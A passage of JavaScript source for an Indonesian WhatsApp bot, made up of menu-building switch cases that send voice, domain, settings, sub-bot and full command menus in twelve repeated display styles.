                                sourceUrl: gr,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v9') {
                  RezzHost.sendMessage(m.chat,{
                  text: ewe,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v10') {
                  RezzHost.sendMessage(m.chat,{
                  video: fs.readFileSync('./media/menu.mp4'),
                  caption: ewe,
                  gifPlayback: true,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v11') {
                  sendres(from, ewe)
                } else if (typemenu === 'v12') {
                  sendmes(from, ewe)
              }
}
break
case 'voicechangermenu': {
if (!isRegistered) return reply2(mess.regis)
await loading()
                     wek = `ʜɪ ${gris}@${m?.sender.split('@')[0]}${gris} 🪸
${stime}, 
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* ${botname}
☏ *Creator :* ${owner}
♗ *Version :* ${versibot}
⧮ *Upload :* ${bdw.upload}
⧯ *Download :* ${bdw.download}
⚿ *Total Fitur :* ${totalFitur()}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status :* ${users.premium}
♗ *Saldo :* ${users.balance}
╾────────────────────╼
${readmore}
${simbolatas}
${simbol0} *V O I C E - M E N U*
${simboltengah}
${global.tTeks}bass *Reply Audio*
${global.tTeks}blown *Reply Audio*
${global.tTeks}deep *Reply Audio*
${global.tTeks}earrape *Reply Audio*
${global.tTeks}fast *Reply Audio*
${global.tTeks}fat *Reply Audio*
${global.tTeks}nightcore *Reply Audio*
${global.tTeks}reverse *Reply Audio*
${global.tTeks}robot *Reply Audio*
${global.tTeks}slow *Reply Audio*
${global.tTeks}smooth *Reply Audio*
${global.tTeks}squirrel *Reply Audio*
${simbolbawah}

${footer}`
let ewe = Styles(wek)
if (typemenu === 'v1') {
                    RezzHost.sendMessage(m.chat, {
                        image: fs.readFileSync('./media/mamak.jpg'),
                        caption: ewe
                    },
                    )
                } else if (typemenu === 'v2') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v3') {
                    RezzHost.sendMessage(m.chat, {
                        video: fs.readFileSync('./media/menu.mp4'),
                        caption: ewe,
                        gifPlayback: true
                    }, 
                    )
                } else if (typemenu === 'v4') {
                    RezzHost.relayMessage(m.chat,  {
                    requestPaymentMessage: {
                    currencyCodeIso4217: 'IDR',
                    amount1000: 1000000000,
                    requestFrom: m.sender,
                    noteMessage: {
                    extendedTextMessage: {
                    text: ewe,
                    contextInfo: {
                    externalAdReply: {
                    showAdAttribution: true,
                    }}}}}}, {})
                } else if (typemenu === 'v5') {
                    RezzHost.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: ewe
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    RezzHost.sendMessage(m.chat, {
                    document: fs.readFileSync('./media/doc.pdf'), 
                    thumbnailUrl: ppuser,
                    mimetype: 'application/pdf',
                    fileLength: 99999,
                    pageCount: '100',
                    fileName: `${ownername}`,
                    caption: ewe,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: hariini,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v7') {
                    RezzHost.sendMessage(m.chat, {
                    video: fs.readFileSync('./media/menu.mp4'),
                    caption: ewe,
                    gifPlayback: true,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: gr,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v8') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${tag}`,
                                body: '',
                                thumbnailUrl: tumburl,
                                sourceUrl: gr,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v9') {
                  RezzHost.sendMessage(m.chat,{
                  text: ewe,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v10') {
                  RezzHost.sendMessage(m.chat,{
                  video: fs.readFileSync('./media/menu.mp4'),
                  caption: ewe,
                  gifPlayback: true,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v11') {
                  sendres(from, ewe)
                } else if (typemenu === 'v12') {
                  sendmes(from, ewe)
              }
}
break
case 'domainmenu': {
if (!isRegistered) return reply2(mess.regis)
await loading()
                     wek = `ʜɪ ${gris}@${m?.sender.split('@')[0]}${gris} 🪸
${stime}, 
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* ${botname}
☏ *Creator :* ${owner}
♗ *Version :* ${versibot}
⧮ *Upload :* ${bdw.upload}
⧯ *Download :* ${bdw.download}
⚿ *Total Fitur :* ${totalFitur()}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status :* ${users.premium}
♗ *Saldo :* ${users.balance}
╾────────────────────╼
${readmore}
${simbolatas}
${simbol0} *D O M A I N - M E N U*
${simboltengah}
${global.tTeks}sdomain
${global.tTeks}addgc
${global.tTeks}delgc 
${global.tTeks}domain1 panellofficial.my.id
${global.tTeks}domain2 panellkuofficial.tech
${global.tTeks}domain3 panellofficial.site
${global.tTeks}domain4 sellerpanel-vvip.my.id
${global.tTeks}domain5 shopwebsite.my.id
${global.tTeks}domain6 mypanell-store.com
${global.tTeks}domain7 dewapanel.my.id
${global.tTeks}domain8 celiaofficial.xyz
${global.tTeks}domain9 mypanel.biz.id
${global.tTeks}domain10 xstxyro.xyz
${global.tTeks}domain11 mypanell.biz.id
${global.tTeks}domain12 sanzofficial.my.id
${global.tTeks}domain13 azaypanelestore.online
${simbolbawah}

${footer}`
let ewe = Styles(wek)
if (typemenu === 'v1') {
                    RezzHost.sendMessage(m.chat, {
                        image: fs.readFileSync('./media/mamak.jpg'),
                        caption: ewe
                    },
                    )
                } else if (typemenu === 'v2') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v3') {
                    RezzHost.sendMessage(m.chat, {
                        video: fs.readFileSync('./media/menu.mp4'),
                        caption: ewe,
                        gifPlayback: true
                    }, 
                    )
                } else if (typemenu === 'v4') {
                    RezzHost.relayMessage(m.chat,  {
                    requestPaymentMessage: {
                    currencyCodeIso4217: 'IDR',
                    amount1000: 1000000000,
                    requestFrom: m.sender,
                    noteMessage: {
                    extendedTextMessage: {
                    text: ewe,
                    contextInfo: {
                    externalAdReply: {
                    showAdAttribution: true,
                    }}}}}}, {})
                } else if (typemenu === 'v5') {
                    RezzHost.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: ewe
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    RezzHost.sendMessage(m.chat, {
                    document: fs.readFileSync('./media/doc.pdf'), 
                    thumbnailUrl: ppuser,
                    mimetype: 'application/pdf',
                    fileLength: 99999,
                    pageCount: '100',
                    fileName: `${ownername}`,
                    caption: ewe,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: hariini,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v7') {
                    RezzHost.sendMessage(m.chat, {
                    video: fs.readFileSync('./media/menu.mp4'),
                    caption: ewe,
                    gifPlayback: true,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: gr,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v8') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${tag}`,
                                body: '',
                                thumbnailUrl: tumburl,
                                sourceUrl: gr,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v9') {
                  RezzHost.sendMessage(m.chat,{
                  text: ewe,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v10') {
                  RezzHost.sendMessage(m.chat,{
                  video: fs.readFileSync('./media/menu.mp4'),
                  caption: ewe,
                  gifPlayback: true,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v11') {
                  sendres(from, ewe)
                } else if (typemenu === 'v12') {
                  sendmes(from, ewe)
              }
}
break
case 'setmenu': {
if (!isRegistered) return reply2(mess.regis)
await loading()
                     wek = `ʜɪ ${gris}@${m?.sender.split('@')[0]}${gris} 🪸
${stime}, 
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* ${botname}
☏ *Creator :* ${owner}
♗ *Version :* ${versibot}
⧮ *Upload :* ${bdw.upload}
⧯ *Download :* ${bdw.download}
⚿ *Total Fitur :* ${totalFitur()}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status :* ${users.premium}
♗ *Saldo :* ${users.balance}
╾────────────────────╼
${readmore}
${simbolatas}
${simbol0} *S E T - M E N U*
${simboltengah}
${global.tTeks}setvid *Reply Vid*
${global.tTeks}setimage *Image*
${global.tTeks}setquoted *Image*
${global.tTeks}setbio/setbotbio *text*
${global.tTeks}setbotname *text*
${global.tTeks}setdac *Domain|Ptla|Ptlc*
${global.tTeks}setexif *text|Text*
${global.tTeks}setowner *Nomor*
${global.tTeks}setppbot *Reply Img*
${global.tTeks}setppgroup *Reply Img*
${global.tTeks}set-menu
${global.tTeks}typemenu *text*
${global.tTeks}viewmenu *q*
${simbolbawah}

${footer}`
let ewe = Styles(wek)
if (typemenu === 'v1') {
                    RezzHost.sendMessage(m.chat, {
                        image: fs.readFileSync('./media/mamak.jpg'),
                        caption: ewe
                    },
                    )
                } else if (typemenu === 'v2') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v3') {
                    RezzHost.sendMessage(m.chat, {
                        video: fs.readFileSync('./media/menu.mp4'),
                        caption: ewe,
                        gifPlayback: true
                    }, 
                    )
                } else if (typemenu === 'v4') {
                    RezzHost.relayMessage(m.chat,  {
                    requestPaymentMessage: {
                    currencyCodeIso4217: 'IDR',
                    amount1000: 1000000000,
                    requestFrom: m.sender,
                    noteMessage: {
                    extendedTextMessage: {
                    text: ewe,
                    contextInfo: {
                    externalAdReply: {
                    showAdAttribution: true,
                    }}}}}}, {})
                } else if (typemenu === 'v5') {
                    RezzHost.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: ewe
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    RezzHost.sendMessage(m.chat, {
                    document: fs.readFileSync('./media/doc.pdf'), 
                    thumbnailUrl: ppuser,
                    mimetype: 'application/pdf',
                    fileLength: 99999,
                    pageCount: '100',
                    fileName: `${ownername}`,
                    caption: ewe,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: hariini,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v7') {
                    RezzHost.sendMessage(m.chat, {
                    video: fs.readFileSync('./media/menu.mp4'),
                    caption: ewe,
                    gifPlayback: true,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: gr,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v8') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${tag}`,
                                body: '',
                                thumbnailUrl: tumburl,
                                sourceUrl: gr,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v9') {
                  RezzHost.sendMessage(m.chat,{
                  text: ewe,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v10') {
                  RezzHost.sendMessage(m.chat,{
                  video: fs.readFileSync('./media/menu.mp4'),
                  caption: ewe,
                  gifPlayback: true,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v11') {
                  sendres(from, ewe)
                } else if (typemenu === 'v12') {
                  sendmes(from, ewe)
              }
}
break
case 'jadibotmenu': {
if (!isRegistered) return reply2(mess.regis)
await loading()
                     wek = `ʜɪ ${gris}@${m?.sender.split('@')[0]}${gris} 🪸
${stime}, 
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* ${botname}
☏ *Creator :* ${owner}
♗ *Version :* ${versibot}
⧮ *Upload :* ${bdw.upload}
⧯ *Download :* ${bdw.download}
⚿ *Total Fitur :* ${totalFitur()}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status :* ${users.premium}
♗ *Saldo :* ${users.balance}
╾────────────────────╼
${readmore}
${simbolatas}
${simbol0} *J A D I B O T  - M E N U*
${simboltengah}
${global.tTeks}stopjadibot
${global.tTeks}jadibot
${global.tTeks}listjadibot
${simbolbawah}

${footer}`
let ewe = Styles(wek)
if (typemenu === 'v1') {
                    RezzHost.sendMessage(m.chat, {
                        image: fs.readFileSync('./media/mamak.jpg'),
                        caption: ewe
                    },
                    )
                } else if (typemenu === 'v2') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: '',
                                thumbnailUrl: ppuser,
                                sourceUrl: hariini,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v3') {
                    RezzHost.sendMessage(m.chat, {
                        video: fs.readFileSync('./media/menu.mp4'),
                        caption: ewe,
                        gifPlayback: true
                    }, 
                    )
                } else if (typemenu === 'v4') {
                    RezzHost.relayMessage(m.chat,  {
                    requestPaymentMessage: {
                    currencyCodeIso4217: 'IDR',
                    amount1000: 1000000000,
                    requestFrom: m.sender,
                    noteMessage: {
                    extendedTextMessage: {
                    text: ewe,
                    contextInfo: {
                    externalAdReply: {
                    showAdAttribution: true,
                    }}}}}}, {})
                } else if (typemenu === 'v5') {
                    RezzHost.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                           callType: "AUDIO",
                           scheduledTimestampMs: 1200,
                           title: ewe
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    RezzHost.sendMessage(m.chat, {
                    document: fs.readFileSync('./media/doc.pdf'), 
                    thumbnailUrl: ppuser,
                    mimetype: 'application/pdf',
                    fileLength: 99999,
                    pageCount: '100',
                    fileName: `${ownername}`,
                    caption: ewe,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: hariini,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v7') {
                    RezzHost.sendMessage(m.chat, {
                    video: fs.readFileSync('./media/menu.mp4'),
                    caption: ewe,
                    gifPlayback: true,
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `乂 ${command}`,
                            body: '',
                            thumbnailUrl: ppuser,
                            sourceUrl: gr,
                            mediaType: 1,
                            renderLargerThumbnail: true
                        }
                    }
                },
              )
                } else if (typemenu === 'v8') {
                    RezzHost.sendMessage(m.chat, {
                        text: ewe,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: `${tag}`,
                                body: '',
                                thumbnailUrl: tumburl,
                                sourceUrl: gr,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    },
                    )
                } else if (typemenu === 'v9') {
                  RezzHost.sendMessage(m.chat,{
                  text: ewe,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v10') {
                  RezzHost.sendMessage(m.chat,{
                  video: fs.readFileSync('./media/menu.mp4'),
                  caption: ewe,
                  gifPlayback: true,
                  contextInfo:{
                  externalAdReply:{
                  showAdAttribution: true,
                     title: `© 2024 | ${wm}`,
                     body: `github.com`,
                     thumbnailUrl: ppuser,
                     mediaType:2,
                     mediaUrl: `https://instagram.com/raffa_annd?igshid=OGQ5ZDc2ODk2ZA==`,
                     }}
                   },
                  )
                } else if (typemenu === 'v11') {
                  sendres(from, ewe)
                } else if (typemenu === 'v12') {
                  sendmes(from, ewe)
              }
}
break
case 'allmenu': {
if (!isRegistered) return reply2(mess.regis)
await loading()
wek = `ʜɪ ${gris}@${m?.sender.split('@')[0]}${gris} 🪸
${stime}, 
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* ${botname}
☏ *Creator :* ${owner}
♗ *Version :* ${versibot}
⧮ *Upload :* ${bdw.upload}
⧯ *Download :* ${bdw.download}
⚿ *Total Fitur :* ${totalFitur()}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status :* ${users.premium}
♗ *Saldo :* ${users.balance}
╾────────────────────╼
${readmore}
${simbolatas}
${simbol0} *O W N E R - M E N U*
${simboltengah}
${global.tTeks}addcase *case*
${global.tTeks}addprem *nomor day*
${global.tTeks}autojpm *on / off*
${global.tTeks}backup
${global.tTeks}bcgc *text*
${global.tTeks}bcimg *Image*
${global.tTeks}bcimg2 *Image*
${global.tTeks}bandwidth
${global.tTeks}cekdrive
${global.tTeks}cekidgc
${global.tTeks}cekip/ip *Link*
${global.tTeks}creategc *text*
${global.tTeks}delsesi
${global.tTeks}delprem *nomor*
${global.tTeks}delcase *case*
${global.tTeks}getcase *name case*
${global.tTeks}jpmimg *image*
${global.tTeks}listcase
${global.tTeks}listown
${global.tTeks}listgc
${global.tTeks}listpc
${global.tTeks}listprem
${global.tTeks}myip
${global.tTeks}nowa *62xx*
${global.tTeks}onlygc *enable / disable*
${global.tTeks}onlypc *enable / disable*
${global.tTeks}pushkontak *text*
${global.tTeks}pushkontak2 *text|Idgc*
${global.tTeks}pushmember *text*
${global.tTeks}save *text*
${global.tTeks}totalfitur
${global.tTeks}whois *Link*
${simboltengah}
${simbol0} *G R O U P - M E N U*
${simboltengah}
${global.tTeks}add *628xx*
${global.tTeks}antilink *enable / disable*
${global.tTeks}antibot *enable / disable*
${global.tTeks}closetime *text*
${global.tTeks}clone *idgc*
${global.tTeks}cekasalmember
${global.tTeks}delppgc
${global.tTeks}demote *628xx*
${global.tTeks}demoteall
${global.tTeks}editdesk *text*
${global.tTeks}editgroup *close / open*
${global.tTeks}editinfo *on / off*
${global.tTeks}editsubjek *text*
${global.tTeks}ephemeral *on / off*
${global.tTeks}friend
${global.tTeks}getidgc
${global.tTeks}getkontak
${global.tTeks}hidetag *text*
${global.tTeks}inspect *text*
${global.tTeks}invite *nomor*
${global.tTeks}join *Link*
${global.tTeks}kick *628xx*
${global.tTeks}kickall
${global.tTeks}leave
${global.tTeks}linkgroup
${global.tTeks}liston
${global.tTeks}mute *reply*
${global.tTeks}opentime *text*
${global.tTeks}promote *628xx*
${global.tTeks}promoteall
${global.tTeks}pushkontak *text*
${global.tTeks}react *Emoji*
${global.tTeks}resetlinkgc
${global.tTeks}sendlinkgc *628xx*
${global.tTeks}setdesk *text*
${global.tTeks}setname *text*
${global.tTeks}tagall *text*
${global.tTeks}totag *Reply*
${global.tTeks}welcome *enable / disable*
${global.tTeks}larangan
${simboltengah}
${simbol0} *J A D I B O T  - M E N U*
${simboltengah}
${global.tTeks}stopjadibot
${global.tTeks}jadibot
${global.tTeks}listjadibot
${simboltengah}
${simbol0} *C O N V E R T - M E N U*
${simboltengah}
${global.tTeks}ardi *text*
${global.tTeks}aoi *text*
${global.tTeks}dimas *text*
${global.tTeks}daichi *text*
${global.tTeks}filetourl *reply File*
${global.tTeks}gadis *text*
${global.tTeks}jajang *text*
${global.tTeks}janie *text*
${global.tTeks}mayu *text*
${global.tTeks}naoki *text*
${global.tTeks}shiori *text*
${global.tTeks}siti *text*
${global.tTeks}tuti *text*
${global.tTeks}toaksara *text*
${global.tTeks}tolatin *text*
${global.tTeks}tohuruf *text*
${global.tTeks}toaud *reply audio*
${global.tTeks}togif *reply sticker*
${global.tTeks}toimg *reply sticker*
${global.tTeks}tomp3 *reply vid*
${global.tTeks}tomp4 *reply gif*
${global.tTeks}toptv *reply vid*
${global.tTeks}topdf *reply img*
${global.tTeks}toqr *reply link*
${global.tTeks}tourl *reply img*
${global.tTeks}tourl2 
${global.tTeks}tovid *reply gif*
${global.tTeks}tovideo *reply gif*
${global.tTeks}tovn *reply vid*
${global.tTeks}urltoimg *reply link*
${global.tTeks}upload *reply vid*
${simboltengah}
${simbol0} *M A I N - M E N U*
${simboltengah}
${global.tTeks}autoread *on / off*
${global.tTeks}autobio *on / off*
${global.tTeks}autodlgc *on / off*
${global.tTeks}brainly *Query*
${global.tTeks}bagi 
${global.tTeks}buyprem
${global.tTeks}btc *text*
${global.tTeks}botcomment *text*
${global.tTeks}block *Nomor*
${global.tTeks}claim
${global.tTeks}cekvps
${global.tTeks}del *Reply*
${global.tTeks}darkjoke
${global.tTeks}editmsg *reply*
${global.tTeks}hitday
${global.tTeks}jadwal
${global.tTeks}kali
${global.tTeks}kurang
${global.tTeks}listacc
${global.tTeks}listfont
${global.tTeks}listmodapk
${global.tTeks}listtemplate
${global.tTeks}memeindo
${global.tTeks}meme
${global.tTeks}owner
${global.tTeks}ping
${global.tTeks}pesan *text*
${global.tTeks}public
${global.tTeks}qcimg *text* 
${global.tTeks}qc *text*
${global.tTeks}qc2 *text*
${global.tTeks}restart
${global.tTeks}register 
${global.tTeks}runtime
${global.tTeks}roboguru *Query*
${global.tTeks}server 
${global.tTeks}self
${global.tTeks}sticker *Reply Img*
${global.tTeks}s-avatar *Reply Img*
${global.tTeks}script
${global.tTeks}stickmeme *text*
${global.tTeks}smeme *text*
${global.tTeks}textblank
${global.tTeks}tes
${global.tTeks}tqto
${global.tTeks}tambah
${global.tTeks}unblock *Nomor*
${global.tTeks}ytcomment *text*
${simboltengah}
${simbol0} *V O I C E - M E N U*
${simboltengah}
${global.tTeks}bass *Reply Audio*
${global.tTeks}blown *Reply Audio*
${global.tTeks}deep *Reply Audio*
${global.tTeks}earrape *Reply Audio*
${global.tTeks}fast *Reply Audio*
${global.tTeks}fat *Reply Audio*
${global.tTeks}nightcore *Reply Audio*
${global.tTeks}reverse *Reply Audio*
${global.tTeks}robot *Reply Audio*
${global.tTeks}slow *Reply Audio*
${global.tTeks}smooth *Reply Audio*
${global.tTeks}squirrel *Reply Audio*
${simboltengah}
${simbol0} *V N - M E N U*
${simboltengah}
${global.tTeks}vnindonesia *text*
${global.tTeks}vnjepang *text*
${global.tTeks}vnenglish *text*
${global.tTeks}vnmyanmar *text*
${global.tTeks}vnrusia *text*
${global.tTeks}vnitalia *text*
${global.tTeks}vnjerman *text*
${global.tTeks}vnfranch *text*
${global.tTeks}vnphilipines *text*
${global.tTeks}vnindia *text*
${global.tTeks}vnthailand *text*
${simboltengah}
${simbol0} *D O W N L O A D - M E N U*
${simboltengah}
${global.tTeks}9appsdl *link*
${global.tTeks}android1 *query*
${global.tTeks}android1dl *link*
${global.tTeks}amv *1/2*
${global.tTeks}apk *id*
${global.tTeks}apkdl *link*
${global.tTeks}apktoide *query*
${global.tTeks}apktoidedl *package*
${global.tTeks}apkmirror *link*
${global.tTeks}apkfab *link*
${global.tTeks}apkfabsearch *query*
${global.tTeks}bandcamp *query*
${global.tTeks}bandcampdl *link*
${global.tTeks}cocofun *ink*
${global.tTeks}cocofun2 *link*
${global.tTeks}capcut *link*
${global.tTeks}capcut2 *link*
${global.tTeks}devianart *query*
${global.tTeks}devianartdl *link*
${global.tTeks}douyin *link*
${global.tTeks}douyinmp3 *link*
${global.tTeks}facebook *link*
${global.tTeks}facebook2 *link*
${global.tTeks}getmusic *reply*
${global.tTeks}getvideo *reply*
${global.tTeks}gitclone *link*
${global.tTeks}gdrive *link*
${global.tTeks}giphy *query*
${global.tTeks}googlepodcast *query*
${global.tTeks}getweb *link*
${global.tTeks}highlights *link*
${global.tTeks}happymod *query*
${global.tTeks}happymoddl *link*
${global.tTeks}imgur *link*
${global.tTeks}instagram *link*
${global.tTeks}instagram2 *link*
${global.tTeks}igdl *link*
${global.tTeks}ig *link*
${global.tTeks}igjpg *link*
${global.tTeks}igstory *query*
${global.tTeks}imdb *query movie*
${global.tTeks}joox *query*
${global.tTeks}jooxdl *link*
${global.tTeks}kusonime *query*
${global.tTeks}kusonime2 *query*
${global.tTeks}kusonimeget *link*
${global.tTeks}kiryuusearch *query*
${global.tTeks}krakendl *link*
${global.tTeks}likevideo *link*
${global.tTeks}linestick *link*
${global.tTeks}mangatoons *query*
${global.tTeks}mangatoons2 *query*
${global.tTeks}mangasearch *query*
${global.tTeks}megadl *link*
${global.tTeks}moewalls *query / link*
${global.tTeks}mediafire *link*
${global.tTeks}pinterest *query*
${global.tTeks}pinterest2 *query*
${global.tTeks}pixabay *query*
${global.tTeks}playmods *query*
${global.tTeks}playmodsdl *link*
${global.tTeks}play *query*
${global.tTeks}play2 *query*
${global.tTeks}playstore *query*
${global.tTeks}playstoredl *link*
${global.tTeks}pinterestdl *link*
${global.tTeks}pinvideo *link*
${global.tTeks}pixiv *query*
${global.tTeks}pixeldrain *link*
${global.tTeks}ringtone *query*
${global.tTeks}rexdl *link*
${global.tTeks}sfile *query*
${global.tTeks}sfiledl *link*
${global.tTeks}sfiledl2 *link*
${global.tTeks}sharechat *link*
${global.tTeks}song *query*
${global.tTeks}soundcloudsearch *query*
${global.tTeks}soundcloud *link*
${global.tTeks}soundcloud2 *link*
${global.tTeks}spotify *link*
${global.tTeks}spotify2 *link*
${global.tTeks}spotifylist *link*
${global.tTeks}spotifysearch *query*
${global.tTeks}spotifysearch2 *query*
${global.tTeks}stickersearch *query*
${global.tTeks}snackvideo *link*
${global.tTeks}savetik *link*
${global.tTeks}snaptik *link*
${global.tTeks}tiktokaudio *link*
${global.tTeks}tt *link*
${global.tTeks}tiktokvideo *link*
